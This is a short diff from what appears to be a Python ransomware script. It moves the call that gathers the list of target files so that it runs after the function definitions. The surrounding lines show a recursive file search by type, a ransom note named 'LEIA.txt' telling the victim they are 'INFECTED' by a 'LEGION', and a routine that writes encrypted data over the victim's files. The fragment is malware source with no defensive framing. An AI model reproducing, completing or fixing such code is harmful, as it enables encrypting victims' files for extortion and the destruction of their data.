@@ -36,7 +36,6 @@ def varer():
         for filename in Path(base_path).rglob(t):
             pastas.append(form(filename))
     return pastas
-lst_past = varer()
 def txt():
     msg=open(f'{y}\\LEIA.txt','w+')
     msg.writelines("YOU HAVE BEEN INFECTED BY ENTERING SITES ABOBINABLE BY OUR LEGION.\nAND NOW SUFFERING THE CONSEQUENCES.\n")
@@ -59,6 +58,7 @@ def criptografando():
             new_file = open(f'{desktop}\\{new_file}', 'wb')
             new_file.write(crypto_data)
             new_file.close()
+lst_past = varer()
 for i in lst_past:
     try:
         desktop = Path.home() / i
